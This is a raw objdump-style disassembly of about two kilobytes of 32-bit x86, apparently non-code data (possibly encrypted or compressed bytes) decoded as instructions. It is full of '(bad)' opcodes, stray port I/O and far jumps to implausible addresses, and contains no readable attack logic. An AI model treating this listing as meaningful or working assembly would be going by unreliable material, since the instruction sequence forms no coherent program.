  4207fb:	mov    al,ds:0xe4d148d4
  420800:	mov    al,0x7b
  420802:	xchg   ebx,eax
  420803:	mov    bh,0x46
  420805:	out    0x2b,al
  420807:	xor    al,0x62
  420809:	test   eax,0xf67a0982
  42080e:	cli    
  42080f:	out    dx,al
  420810:	data16 mov bh,0x91
  420813:	in     eax,0x48
  420815:	xchg   edx,eax
  420816:	add    cl,BYTE PTR [esi]
  420818:	jl     0x42084d
  42081a:	add    cl,al
  42081c:	jmp    0x90016407
  420821:	sub    al,0x5c
  420823:	stos   DWORD PTR es:[edi],eax
  420824:	push   0xffffffeb
  420826:	jne    0x420898
  420828:	mov    ch,0x65
  42082a:	dec    esp
  42082b:	popf   
  42082c:	fdivr  st,st(6)
  42082e:	or     eax,ebp
  420830:	and    edi,0x99f78931
  420836:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420837:	cli    
  420838:	add    DWORD PTR [ebx-0x47],eax
  42083b:	push   eax
  42083c:	mov    al,0x13
  42083e:	adc    eax,esp
  420840:	clc    
  420841:	retf   
  420842:	inc    esp
  420843:	adc    DWORD PTR [edx],0xc493193b
  420849:	pop    es
  42084a:	ja     0x42088e
  42084c:	ret    0x96eb
  42084f:	lods   al,BYTE PTR ds:[esi]
  420850:	mov    ah,0xa1
  420852:	aad    0x67
  420854:	adc    esi,DWORD PTR [ecx-0x2af9cf10]
  42085a:	or     al,0x9
  42085c:	loopne 0x4207e6
  42085e:	xor    DWORD PTR [ebp+ebx*2-0x63],edx
  420862:	repz jl 0x420836
  420865:	aaa    
  420866:	jl     0x4208ac
  420868:	pop    ds
  420869:	cdq    
  42086a:	pusha  
  42086b:	xlat   BYTE PTR ds:[ebx]
  42086c:	in     eax,0x2e
  42086e:	push   eax
  42086f:	cmc    
  420870:	adc    edx,0x2c
  420873:	jo     0x420865
  420875:	(bad)  
  420876:	mov    dl,0xc1
  420878:	xor    al,0x2d
  42087a:	cli    
  42087b:	mov    ds:0x86953fd5,al
  420880:	inc    ebp
  420881:	ins    BYTE PTR es:[edi],dx
  420882:	dec    ebx
  420883:	cmp    DWORD PTR [eax-0x18],eax
  420886:	aad    0x97
  420888:	dec    esi
  420889:	adc    eax,0x7a2a922
  42088e:	in     al,0x2e
  420890:	xor    BYTE PTR [ecx-0x78],dh
  420893:	sub    DWORD PTR [ecx-0x2f9bf452],edx
  420899:	xor    edi,DWORD PTR ss:[esi]
  42089c:	aas    
  42089d:	cld    
  42089e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42089f:	nop
  4208a0:	mov    DWORD PTR [esi+eax*8+0x479da1a1],ebp
  4208a7:	adc    eax,DWORD PTR [esi+0x53]
  4208aa:	test   BYTE PTR [ebp+ebp*4+0x43],dl
  4208ae:	sub    cl,BYTE PTR [ecx+0x26c135f6]
  4208b4:	mov    bl,0x95
  4208b7:	loope  0x42086e
  4208b9:	jle    0x42086e
  4208bb:	pop    es
  4208bc:	mov    dh,0x50
  4208be:	jmp    0x420879
  4208c0:	gs sub eax,0x40c03f72
  4208c6:	push   edi
  4208c7:	and    DWORD PTR [edx+0x259c1a6c],esi
  4208cd:	fcom   st(6)
  4208cf:	hlt    
  4208d0:	cmp    BYTE PTR [ebp+0x4],dl
  4208d3:	jae    0x4208c4
  4208d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208d6:	retf   
  4208d7:	arpl   WORD PTR [edx+0x79ac4f99],bx
  4208dd:	mov    bl,BYTE PTR [esi+eax*8-0x378f7e9b]
  4208e4:	xchg   esp,eax
  4208e5:	repnz les ebx,FWORD PTR [esi-0x1c3347]
  4208ec:	retf   0xe7de
  4208ef:	ins    BYTE PTR es:[edi],dx
  4208f0:	sbb    bh,BYTE PTR [esi-0x2e]
  4208f3:	addr16 sbb eax,0xc291986
  4208f9:	add    al,0xce
  4208fb:	add    bl,dl
  4208fd:	shl    BYTE PTR [edi+ebp*2+0x9596e12],0xec
  420905:	popf   
  420906:	test   BYTE PTR [esi+edx*2-0x75],ah
  42090a:	mov    ebx,0x5be67ec3
  42090f:	mov    ebx,0x73853952
  420914:	jp     0x4208eb
  420916:	mov    ds:0x601b10fa,eax
  42091b:	clc    
  42091c:	mov    ah,0x80
  42091e:	into   
  42091f:	or     bh,BYTE PTR [esi+0x5da0351]
  420925:	inc    ecx
  420926:	mov    bl,0xea
  420928:	jo     0x4208b3
  42092a:	sbb    BYTE PTR [esi+0x4d],cl
  42092d:	fadd   QWORD PTR [ecx]
  42092f:	xor    BYTE PTR [edi-0x41],bh
  420932:	aaa    
  420933:	xchg   edx,eax
  420934:	sbb    al,0x93
  420936:	les    esi,FWORD PTR [eax-0x42]
  420939:	push   esp
  42093a:	push   ecx
  42093b:	ds enter 0x81ed,0xc1
  420940:	cli    
  420941:	ror    DWORD PTR [edx+0x2a023d8e],cl
  420947:	jns    0x42090f
  420949:	jecxz  0x420940
  42094b:	stos   DWORD PTR es:[edi],eax
  42094c:	enter  0x9b5c,0x97
  420950:	pop    esp
  420951:	mov    esi,0xc39a8792
  420956:	aaa    
  420957:	mov    edi,0xb334a2b8
  42095c:	stc    
  42095d:	enter  0x1e74,0x49
  420961:	scas   al,BYTE PTR es:[edi]
  420962:	add    di,WORD PTR [ebp+0x41]
  420966:	xor    ebx,ebp
  420968:	push   cs
  420969:	jae    0x42098b
  42096b:	clc    
  42096c:	shl    BYTE PTR [esi-0x7db91264],1
  420972:	test   DWORD PTR [esi+edx*4],ebx
  420975:	mov    ds:0x2266c096,eax
  42097a:	jmp    0x4209df
  42097c:	daa    
  42097d:	in     al,0xfc
  42097f:	inc    edi
  420980:	jno    0x42091b
  420982:	push   cs
  420983:	mov    eax,0xa87a8c2d
  420988:	mov    edi,0x735d3795
  42098d:	hlt    
  42098e:	out    dx,eax
  42098f:	stc    
  420990:	dec    ecx
  420991:	aaa    
  420992:	mov    bh,0xda
  420994:	inc    edi
  420995:	sahf   
  420996:	or     al,0x9a
  420998:	mov    ?,WORD PTR [ebx+0x4119179e]
  42099e:	jecxz  0x420975
  4209a0:	ret    
  4209a1:	shl    ah,0x60
  4209a4:	mov    WORD PTR ds:0x5fe63dbf,gs
  4209aa:	repnz adc ebx,DWORD PTR [edi+0x3d]
  4209ae:	ret    
  4209af:	push   cs
  4209b0:	adc    bl,BYTE PTR [eax]
  4209b2:	dec    ecx
  4209b3:	stos   DWORD PTR es:[edi],eax
  4209b4:	std    
  4209b5:	pop    esi
  4209b6:	sbb    dh,BYTE PTR [ebp+0x39c77e98]
  4209bc:	gs pop ebp
  4209be:	cmovne eax,DWORD PTR [ebx]
  4209c1:	pop    ss
  4209c2:	cmp    esp,ebp
  4209c4:	dec    edi
  4209c5:	int    0x40
  4209c7:	cmp    eax,0x12ba3f30
  4209cc:	js     0x42097b
  4209ce:	mov    BYTE PTR [ebx-0x76a9de43],al
  4209d4:	not    BYTE PTR [esi+eax*8-0xebc7412]
  4209db:	add    bh,BYTE PTR [esi+0x0]
  4209de:	cmp    DWORD PTR [ecx+ebx*8],edi
  4209e1:	aas    
  4209e2:	xor    bl,ah
  4209e4:	(bad)  
  4209e5:	stc    
  4209e6:	bound  ebx,QWORD PTR [esi]
  4209e8:	mul    DWORD PTR [edi]
  4209ea:	stc    
  4209eb:	cmp    BYTE PTR [ebx+0x631eec31],dl
  4209f1:	cmp    dl,cl
  4209f3:	rcr    dh,1
  4209f5:	inc    eax
  4209f6:	fidiv  DWORD PTR [edi-0x2]
  4209f9:	add    eax,0x604b3d41
  4209fe:	cmp    al,0x30
  420a00:	retf   0xf391
  420a03:	mov    edx,DWORD PTR [ebx]
  420a05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a06:	mov    BYTE PTR [edi+0x58895ce],bl
  420a0c:	push   esi
  420a0d:	xchg   BYTE PTR [ebx],bl
  420a0f:	int3   
  420a10:	ror    BYTE PTR [edi+0x5f],1
  420a13:	not    BYTE PTR [edx]
  420a15:	rol    DWORD PTR [ebp+0x2],0xb0
  420a19:	or     BYTE PTR [ebx+0x6],0x34
  420a1d:	sub    esi,ecx
  420a1f:	cmp    eax,0xa7a312f2
  420a24:	lock xchg edx,eax
  420a26:	mov    edi,DWORD PTR [ecx]
  420a28:	lock pop ds
  420a2a:	pop    esi
  420a2b:	cs cwde 
  420a2d:	fcmovnu st,st(5)
  420a2f:	fwait
  420a30:	dec    edi
  420a31:	iret   
  420a32:	pop    eax
  420a33:	xchg   edx,eax
  420a34:	cdq    
  420a35:	inc    edi
  420a36:	or     ebp,DWORD PTR [ecx]
  420a38:	mov    bl,0xb3
  420a3a:	lods   eax,DWORD PTR ds:[esi]
  420a3b:	in     al,0xd4
  420a3d:	mov    ebx,0xbadbd893
  420a42:	pop    eax
  420a43:	rol    DWORD PTR [ebx-0x121bbfc0],cl
  420a49:	mov    gs,WORD PTR ds:0x43e3db8
  420a4f:	retf   0xfe01
  420a52:	push   esp
  420a53:	mov    edx,0x244c7376
  420a58:	dec    ebp
  420a59:	loop   0x420a99
  420a5b:	popa   
  420a5c:	fdiv   QWORD PTR [ebp+0x71]
  420a5f:	jecxz  0x420a48
  420a61:	ret    0xf944
  420a64:	xor    al,BYTE PTR cs:[esp+ebp*1]
  420a68:	pop    esp
  420a69:	je     0x420a5d
  420a6b:	mov    edx,0xe2107529
  420a70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a71:	mov    bh,0x27
  420a73:	xor    BYTE PTR [esi+ecx*4-0x15],ah
  420a77:	in     al,0x97
  420a79:	add    al,cl
  420a7b:	jmp    0x3525:0xaf843d2f
  420a82:	xor    eax,0xfef2c86
  420a87:	pop    edi
  420a88:	lahf   
  420a89:	mov    al,ds:0x2ffeb040
  420a8e:	push   es
  420a8f:	xchg   ecx,eax
  420a90:	leave  
  420a91:	sahf   
  420a92:	mov    gs,WORD PTR [ecx]
  420a94:	inc    edx
  420a95:	ror    DWORD PTR [ebx],1
  420a97:	mov    dh,0x7a
  420a99:	push   ecx
  420a9a:	popa   
  420a9b:	je     0x420b0c
  420a9d:	or     al,0x5
  420a9f:	jecxz  0x420a34
  420aa1:	xchg   esp,eax
  420aa2:	int3   
  420aa3:	mov    dh,0x97
  420aa5:	xchg   edx,eax
  420aa6:	es push ebp
  420aa8:	test   DWORD PTR [ebx+0x4c06c382],0xaef0ea05
  420ab2:	fst    DWORD PTR [edx+0x41]
  420ab5:	stos   BYTE PTR es:[edi],al
  420ab6:	cdq    
  420ab7:	std    
  420ab8:	jbe    0x420a70
  420aba:	xchg   ecx,eax
  420abb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420abc:	jno    0x420ab2
  420abe:	sbb    al,cl
  420ac0:	mov    dl,0x9b
  420ac2:	xchg   ebx,eax
  420ac3:	and    DWORD PTR [ebp+0x79],ebx
  420ac6:	jmp    0x81963b52
  420acb:	jb     0x420aa4
  420acd:	and    al,0x26
  420acf:	cmp    eax,0x386c314c
  420ad4:	xchg   bp,ax
  420ad6:	adc    al,0x21
  420ad8:	ds pushf 
  420ada:	(bad)  
  420adb:	nop
  420adc:	xchg   esi,eax
  420add:	call   0x4f13ea6b
  420ae2:	leave  
  420ae3:	add    ah,BYTE PTR [ecx+0x6a8c8f63]
  420ae9:	mov    ds:0x9406cbbf,al
  420aee:	test   eax,0x8c03fa80
  420af3:	fstp   DWORD PTR [esi+0x17]
  420af6:	sub    BYTE PTR [esi-0x37],bh
  420af9:	(bad)  
  420afa:	addr16 in eax,0xf3
  420afd:	pop    esi
  420afe:	inc    esi
  420aff:	mov    WORD PTR fs:[edi+0x72],ss
  420b03:	mov    bh,0xe9
  420b05:	addr16 out dx,al
  420b07:	jo     0x420b4c
  420b09:	pop    ebp
  420b0a:	in     eax,0xc9
  420b0c:	adc    eax,0x9e7c97a9
  420b11:	aam    0xc3
  420b13:	mov    BYTE PTR [edi+ecx*1+0x69a3c656],ch
  420b1a:	mov    ah,0x6b
  420b1c:	lds    edx,FWORD PTR [eax-0x1fe984b3]
  420b22:	sub    esp,esp
  420b24:	rcl    BYTE PTR ds:0xfc27493f,1
  420b2a:	jg     0x420b49
  420b2c:	loop   0x420b3f
  420b2e:	jl     0x420b7d
  420b30:	jno    0x420add
  420b32:	mov    ah,0xd1
  420b34:	mov    cl,0x44
  420b36:	outs   dx,BYTE PTR ds:[esi]
  420b37:	xchg   ebp,eax
  420b38:	shl    DWORD PTR [edi],0xc9
  420b3b:	popf   
  420b3c:	sbb    ch,BYTE PTR [eax+esi*2+0x30]
  420b40:	hlt    
  420b41:	ja     0x420b14
  420b43:	out    dx,al
  420b44:	or     DWORD PTR [ebx],ebx
  420b46:	iret   
  420b47:	push   es
  420b48:	stc    
  420b49:	xchg   DWORD PTR [ecx-0x71bd67d2],esi
  420b4f:	out    dx,eax
  420b50:	idiv   DWORD PTR [ebx-0x6761d10]
  420b56:	jg     0x420bb0
  420b58:	repz sti 
  420b5a:	pop    ebx
  420b5b:	or     ch,0x9
  420b5e:	inc    eax
  420b5f:	adc    eax,0x5c00fc02
  420b64:	iret   
  420b65:	outs   dx,DWORD PTR ds:[esi]
  420b66:	leave  
  420b67:	jecxz  0x420b33
  420b69:	cdq    
  420b6a:	or     BYTE PTR [ecx+eax*1+0x3d329c3f],dh
  420b71:	lea    ebp,[edi+0x3d8b805c]
  420b77:	jp     0x420b22
  420b79:	popa   
  420b7a:	mov    ds:0xc47c18e6,eax
  420b7f:	jle    0x420b5e
  420b81:	popa   
  420b82:	mov    al,ds:0x4ee9aa56
  420b87:	pop    ebx
  420b88:	ja     0x420b48
  420b8a:	js     0x420bac
  420b8c:	aam    0x33
  420b8e:	ret    0x7d56
  420b91:	push   ds
  420b92:	ficom  WORD PTR [ebx+ebp*2+0x6976b629]
  420b99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b9a:	sub    ebx,DWORD PTR [edi]
  420b9c:	jle    0x420c0c
  420b9e:	xchg   DWORD PTR [eax],ebx
  420ba0:	shl    BYTE PTR [edx],0xaf
  420ba3:	enter  0x2f73,0xa8
  420ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ba8:	xlat   BYTE PTR ds:[ebx]
  420ba9:	cs int 0xd
  420bac:	inc    ecx
  420bad:	mov    ebx,0x4498902b
  420bb2:	dec    ebx
  420bb3:	(bad)  
  420bb5:	dec    esp
  420bb6:	js     0x420b9a
  420bb8:	xchg   edi,ecx
  420bba:	call   0xe01fddd4
  420bbf:	dec    ebp
  420bc0:	sub    edi,eax
  420bc2:	push   ss
  420bc3:	mov    eax,0x42edcfac
  420bc8:	test   BYTE PTR [edx+0x33],0xe9
  420bcc:	mov    cl,0x57
  420bce:	mov    esp,0xb4495992
  420bd3:	sbb    eax,0x1749879f
  420bd8:	inc    eax
  420bd9:	inc    esi
  420bda:	shl    cl,1
  420bdc:	rcl    ebx,0x90
  420bdf:	jle    0x420be0
  420be1:	test   cl,ch
  420be3:	outs   dx,DWORD PTR ds:[esi]
  420be4:	shl    BYTE PTR [ecx],0x28
  420be7:	add    ebx,DWORD PTR [ebp+0x43cfb8a]
  420bed:	jns    0x420bff
  420bef:	sbb    edi,edi
  420bf1:	xchg   edx,eax
  420bf2:	jp     0x420bcc
  420bf4:	stc    
  420bf5:	dec    ebx
  420bf6:	(bad)  
  420bf8:	mov    esp,0xcc5bec51
  420bfd:	dec    edx
  420bfe:	mov    ebx,0x14e40409
  420c03:	adc    BYTE PTR [edi+0x707d5143],dl
  420c09:	mov    bh,BYTE PTR [esp+ebx*4+0x7083cbf5]
  420c10:	jae    0x420bf0
  420c12:	cmc    
  420c13:	shr    ebx,1
  420c15:	mov    al,0x96
  420c17:	or     dl,BYTE PTR gs:[ebx+0x18600da2]
  420c1e:	cmp    DWORD PTR [ebp-0x7e7b6cea],0x25
  420c25:	(bad)  
  420c26:	xchg   ecx,eax
  420c27:	xor    DWORD PTR [esi+0x7e],esp
  420c2a:	mov    esi,esi
  420c2c:	mov    edi,0xf007f554
  420c31:	and    BYTE PTR [esi+0x38],bl
  420c34:	pop    edx
  420c35:	fcom   DWORD PTR [edi-0x1aa6a097]
  420c3b:	xchg   edx,eax
  420c3c:	aas    
  420c3d:	(bad)  
  420c3e:	fadd   DWORD PTR [esi-0x42]
  420c41:	sbb    eax,0x4dbe94c1
  420c46:	rol    BYTE PTR [ebx-0xa],0x1a
  420c4a:	mov    eax,ds:0xdf704b1e
  420c4f:	mov    al,ds:0xd8e53cb
  420c54:	iret   
  420c55:	and    DWORD PTR [edx+0x3a],esp
  420c58:	add    al,0x4c
  420c5a:	and    DWORD PTR [edx+0x594e786],0xdc27468
  420c64:	pop    edi
  420c65:	shl    DWORD PTR [esi+eax*2+0x5a3f8453],cl
  420c6c:	dec    edi
  420c6d:	test   DWORD PTR [ecx],edx
  420c6f:	xchg   ebp,eax
  420c70:	rcr    DWORD PTR [edx],0xbf
  420c73:	jge    0x420c2b
  420c75:	or     DWORD PTR [edx+0x37],edi
  420c78:	int    0x15
  420c7a:	pop    ds
  420c7b:	into   
  420c7c:	push   esi
  420c7d:	sbb    dh,bl
  420c7f:	mov    edi,0xf2ffb3a5
  420c84:	xchg   ebx,eax
  420c85:	fxtract 
  420c87:	sbb    edi,ebx
  420c89:	mov    bl,0x2
  420c8b:	xchg   dl,al
  420c8d:	dec    cl
  420c8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c90:	mov    ds:0x48311889,al
  420c95:	cld    
  420c96:	loop   0x420c97
  420c98:	dec    edx
  420c99:	mov    ch,0xd2
  420c9b:	pop    esi
  420c9c:	in     al,0xea
  420c9e:	rcr    DWORD PTR ds:0x90cff816,0xf
  420ca5:	(bad)  
  420ca7:	dec    edx
  420ca8:	push   ebx
  420ca9:	pop    eax
  420caa:	repnz aam 0xef
  420cad:	popa   
  420cae:	mov    edi,0x4c48fca6
  420cb3:	fistp  WORD PTR [esi]
  420cb5:	pop    esi
  420cb6:	push   ebp
  420cb7:	jae    0x420c97
  420cb9:	test   DWORD PTR [ecx+0x2069cbb1],ecx
  420cbf:	xor    DWORD PTR [edi+edx*1+0x47],edx
  420cc3:	cld    
  420cc4:	mov    es,WORD PTR [ebx+edx*1+0x9]
  420cc8:	gs lock mov ecx,0x4ac1df87
  420ccf:	test   BYTE PTR [edi+0x727309ac],al
  420cd5:	test   eax,0xe462697b
  420cda:	sbb    DWORD PTR [eax-0x1f20786b],ebx
  420ce0:	(bad)  
  420ce1:	pushf  
  420ce2:	test   BYTE PTR [edx-0xff986c7],al
  420ce8:	hlt    
  420ce9:	xchg   edx,eax
  420cea:	mov    al,BYTE PTR [edi]
  420cec:	xor    edx,DWORD PTR [edx+0x76c004a9]
  420cf2:	ins    DWORD PTR es:[edi],dx
  420cf3:	jl     0x420cb5
  420cf5:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  420cf7:	mov    ecx,0x2c1adcd6
  420cfc:	and    al,0x4
  420cfe:	xchg   edi,eax
  420cff:	stc    
  420d00:	add    BYTE PTR [ecx],ah
  420d02:	xchg   esi,eax
  420d03:	jmp    0x420c92
  420d05:	dec    edx
  420d06:	test   eax,0x730c2bf1
  420d0b:	scas   al,BYTE PTR es:[edi]
  420d0c:	inc    eax
  420d0d:	sahf   
  420d0e:	mov    BYTE PTR [ebp-0x1a],ah
  420d11:	xchg   ecx,eax
  420d12:	mov    ds:0x5f9c9421,eax
  420d17:	pop    ecx
  420d18:	pop    esp
  420d19:	dec    edi
  420d1a:	fadd   DWORD PTR [ebx]
  420d1c:	retf   0xb5a3
  420d1f:	pop    esp
  420d20:	mov    esp,0x9ad103bc
  420d25:	xor    bh,ch
  420d27:	in     eax,0xec
  420d29:	imul   DWORD PTR [eax-0x3e]
  420d2c:	sub    BYTE PTR [edx-0x6064f892],bh
  420d32:	mov    eax,0x3cdde966
  420d37:	sti    
  420d38:	fwait
  420d39:	mov    eax,DWORD PTR [ebx]
  420d3b:	je     0x420d19
  420d3d:	mov    ds:0xfcfc72db,eax
  420d42:	add    bh,0x2a
  420d45:	das    
  420d46:	jae    0x420d37
  420d48:	(bad)  
  420d49:	sub    eax,0xd6c4252c
  420d4e:	mov    ds:0x10cbe2b1,al
  420d53:	pop    es
  420d54:	jae    0x420dbe
  420d56:	jle    0x420cfb
  420d58:	and    BYTE PTR ds:0x44a1c2ac,ch
  420d5e:	imul   esi,DWORD PTR [ebx+0x51],0xaa600add
  420d65:	int3   
  420d66:	xchg   esi,eax
  420d67:	sub    eax,0xc5c2f52f
  420d6c:	jnp    0x420d56
  420d6e:	leave  
  420d6f:	ds mov ah,0x79
  420d72:	loop   0x420d09
  420d74:	arpl   ax,ax
  420d76:	inc    esp
  420d77:	sub    esp,edi
  420d79:	sbb    DWORD PTR [esi],esp
  420d7b:	ret    
  420d7c:	ds dec esi
  420d7e:	in     eax,dx
  420d7f:	mov    eax,ds:0x4bd38592
  420d84:	and    bh,BYTE PTR [edx-0x1330ad7f]
  420d8a:	jno    0x420dd2
  420d8c:	sub    eax,0x6f7969c8
  420d91:	adc    ebp,esp
  420d93:	or     DWORD PTR ds:0x60046e0f,edx
  420d99:	lock leave 
  420d9b:	fistp  DWORD PTR ds:0x6a6bc800
  420da1:	mov    bh,0xf7
  420da3:	and    BYTE PTR ds:0x9c8fdf11,bh
  420daa:	aas    
  420dab:	rcl    BYTE PTR [edx+0x6c],0x82
  420daf:	rcl    BYTE PTR [ebx+eiz*8+0x59],cl
  420db3:	pop    ebx
  420db4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420db5:	dec    edi
  420db6:	nop
  420db7:	scas   al,BYTE PTR es:[edi]
  420db8:	xor    eax,0x9130b423
  420dbd:	loop   0x420dfc
  420dbf:	stos   DWORD PTR es:[edi],eax
  420dc0:	or     ah,BYTE PTR [ebx]
  420dc2:	mov    eax,ds:0x3ae932e0
  420dc7:	push   0xffffffd6
  420dc9:	xor    cl,BYTE PTR [ebp-0x13]
  420dcc:	mov    ebx,0xb3fe5c24
  420dd1:	sbb    BYTE PTR [edi-0x5365073e],0x70
  420dd8:	cs jnp 0x420e28
  420ddb:	mov    ah,BYTE PTR [eax-0x75]
  420dde:	rcl    edx,1
  420de0:	or     eax,0xfea9563a
  420de5:	dec    ebx
  420de6:	add    al,0x98
  420de8:	jmp    0x420e57
  420dea:	and    bl,BYTE PTR [ecx]
  420dec:	dec    edi
  420ded:	mov    BYTE PTR [edx+0x59895b81],cl
  420df3:	outs   dx,BYTE PTR ds:[esi]
  420df4:	(bad)  
  420df6:	mov    edi,0x2041a20
  420dfb:	std    
  420dfc:	scas   al,BYTE PTR es:[edi]
  420dfd:	sbb    al,0xe0
  420dff:	lods   al,BYTE PTR ds:[esi]
  420e00:	xchg   ecx,eax
  420e01:	push   edi
  420e02:	and    eax,0xe4eed7c2
  420e07:	mov    bh,0x68
  420e09:	arpl   WORD PTR [ebx],cx
  420e0b:	in     eax,0xd4
  420e0d:	mov    ds,ebx
  420e0f:	shl    DWORD PTR [edi+0x4481771f],1
  420e15:	and    BYTE PTR [ebp-0x4c],al
  420e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e19:	vaddsubps ymm1,ymm1,ymm3
  420e1d:	jo     0x420e5e
  420e1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e20:	in     al,dx
  420e21:	fistp  DWORD PTR [edx]
  420e23:	push   es
  420e24:	lods   eax,DWORD PTR ds:[esi]
  420e25:	jmp    0x6e1a:0xd69a495b
  420e2c:	pop    ecx
  420e2d:	push   ecx
  420e2e:	xor    ch,BYTE PTR [esi]
  420e30:	mov    eax,ds:0x95eb349b
  420e35:	mov    BYTE PTR [edx+eax*4-0x15],0xb1
  420e3a:	pop    edx
  420e3b:	inc    eax
  420e3c:	inc    esp
  420e3d:	rol    ebx,cl
  420e3f:	fnstsw WORD PTR [ecx]
  420e41:	xor    al,0x1e
  420e43:	ds sub al,0xca
  420e46:	push   cs
  420e47:	shl    DWORD PTR [ebp+0x2188897f],0xb
  420e4e:	je     0x420dd7
  420e50:	ret    0xcc85
  420e53:	das    
  420e54:	rcr    ch,1
  420e56:	lods   al,BYTE PTR ds:[esi]
  420e57:	out    dx,eax
  420e58:	mov    dh,0x6
  420e5a:	cs mov ebx,ss
  420e5d:	imul   ebx,DWORD PTR [eax-0x3a75d61b],0x9164e161
  420e67:	mov    ds:0x4f06aad0,eax
  420e6c:	jle    0x420e79
  420e6e:	test   eax,0x48a15b40
  420e73:	adc    al,0x49
  420e75:	mov    ch,bh
  420e77:	int3   
  420e78:	mov    ebp,eax
  420e7a:	loopne 0x420edb
  420e7c:	mov    edi,0x30daf651
  420e81:	ss pusha 
  420e83:	repnz dec esi
  420e85:	mov    dh,0x9e
  420e87:	fwait
  420e88:	in     eax,0x1b
  420e8a:	popa   
  420e8b:	lods   al,BYTE PTR ds:[esi]
  420e8c:	sahf   
  420e8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e8e:	mov    dh,0xe5
  420e90:	ret    0xc535
  420e93:	and    esp,DWORD PTR [ecx-0x8]
  420e96:	jno    0x420ec3
  420e98:	cli    
  420e99:	loop   0x420edd
  420e9b:	std    
  420e9c:	ins    DWORD PTR es:[edi],dx
  420e9d:	push   0x35
  420e9f:	inc    edx
  420ea0:	push   es
  420ea1:	fs mov esi,0x4a165925
  420ea7:	sti    
  420ea8:	fst    QWORD PTR [esi]
  420eaa:	cmp    DWORD PTR [edi-0x8],ebx
  420ead:	pop    esp
  420eae:	test   ebx,edx
  420eb0:	jne    0x420f2f
  420eb2:	pop    esi
  420eb3:	cmp    BYTE PTR [esi],bl
  420eb5:	sub    al,BYTE PTR [esi+0x45904bad]
  420ebb:	call   0x730c:0xe608676c
  420ec2:	lahf   
  420ec3:	mov    ecx,edi
  420ec5:	pop    esp
  420ec6:	pusha  
  420ec7:	sub    ebx,DWORD PTR [eax-0x52]
  420eca:	rol    BYTE PTR [eax+0x59],1
  420ecd:	ss add eax,0x393066db
  420ed3:	fsubr  DWORD PTR [edi]
  420ed5:	or     al,0x1f
  420ed7:	(bad)  
  420ed8:	addr16 sti 
  420eda:	and    al,ah
  420edc:	outs   dx,BYTE PTR ds:[esi]
  420edd:	jge    0x420e6e
  420edf:	pushf  
  420ee0:	sub    cl,BYTE PTR [ebp+0x45a70907]
  420ee6:	adc    eax,0x61d8dfc4
  420eeb:	out    dx,al
  420eec:	pushf  
  420eed:	pop    ebp
  420eee:	retf   0x9fbe
  420ef1:	mov    al,ds:0xcfc3f1dd
  420ef6:	push   edi
  420ef7:	sub    BYTE PTR [bp+si-0x23cd],al
  420efc:	popf   
  420efd:	jo     0x420ede
  420eff:	dec    edx
  420f00:	sahf   
  420f01:	push   es
  420f02:	mov    ebx,0x8590ba63
  420f07:	xchg   edx,eax
  420f08:	mov    edi,DWORD PTR [edi]
  420f0a:	add    cl,ch
  420f0c:	das    
  420f0d:	fisub  DWORD PTR [ecx+edi*2+0x61e5dc72]
  420f14:	xor    DWORD PTR [ecx],0xe
  420f17:	jle    0x420f54
  420f19:	xor    edi,ebx
  420f1b:	pop    ss
  420f1c:	inc    ecx
  420f1d:	xchg   ch,dl
  420f1f:	cmp    BYTE PTR [eax],dh
  420f21:	pop    ebx
  420f22:	out    0x28,eax
  420f24:	sub    dl,bh
  420f26:	mov    dl,0xfa
  420f28:	adc    cl,BYTE PTR [eax]
  420f2a:	or     BYTE PTR [ebp+0x60cb3544],ch
  420f30:	inc    esi
  420f31:	cdq    
  420f32:	cmp    ch,BYTE PTR [edx+eax*2-0x29]
  420f36:	or     edx,ebx
  420f38:	cld    
  420f39:	push   ebx
  420f3a:	dec    edx
  420f3b:	in     al,0x2f
  420f3d:	mov    dh,0xb4
  420f3f:	adc    eax,0xf088f8c6
  420f44:	and    eax,0x67cd9335
  420f49:	pop    es
  420f4a:	stos   BYTE PTR es:[edi],al
  420f4b:	sub    al,0x72
  420f4d:	sbb    bh,cl
  420f4f:	xor    eax,DWORD PTR [ebx]
  420f51:	retf   
  420f52:	inc    eax
  420f53:	and    BYTE PTR [edx],ah
  420f55:	cwde   
  420f56:	add    BYTE PTR ds:0xd0c5dbb9,al
  420f5c:	fst    DWORD PTR [esi-0x3ef300fc]
  420f62:	popa   
  420f63:	pop    ebx
  420f64:	inc    ebx
  420f65:	dec    edi
  420f66:	cs dec ebp
  420f68:	pop    ebx
  420f69:	mov    bh,0x4e
  420f6b:	mov    al,0x35
  420f6d:	stos   BYTE PTR es:[edi],al
  420f6e:	in     eax,dx
  420f6f:	inc    esp
  420f70:	fdivr  QWORD PTR [ebp+0x1b]
  420f73:	or     eax,0xb7a415ee
  420f78:	cld    
  420f79:	xor    DWORD PTR [ebx-0x1e],ebp
  420f7c:	jmp    DWORD PTR [ecx-0x5231eed3]
  420f82:	pop    eax
  420f83:	dec    ebx
  420f84:	sar    DWORD PTR [ebp+0x67947127],cl
  420f8a:	aas    
  420f8b:	push   es
  420f8c:	shr    dh,1
  420f8e:	ja     0x420f47
  420f90:	or     BYTE PTR [esi+ecx*2-0x1d],ah
  420f94:	call   0x7eed18ff
  420f99:	xor    DWORD PTR [eax],esp
  420f9b:	mov    ebp,0xb0a44d27
  420fa0:	imul   ebp,DWORD PTR [edi+0x31],0x1fbc5cf4
  420fa7:	xor    eax,0x5406d0fb
  420fac:	mov    ds:0x1bd2abd4,eax
  420fb1:	call   0x1605:0xeba0138f
  420fb8:	xchg   esp,eax
  420fb9:	mov    edi,0x5ee2306d
  420fbe:	dec    eax
  420fbf:	frstor [ebp+0x13efd1f5]
  420fc5:	sar    BYTE PTR [ecx-0x50fcd9ad],1
  420fcb:	or     eax,0x25d6e88a
  420fd0:	je     0x42103e
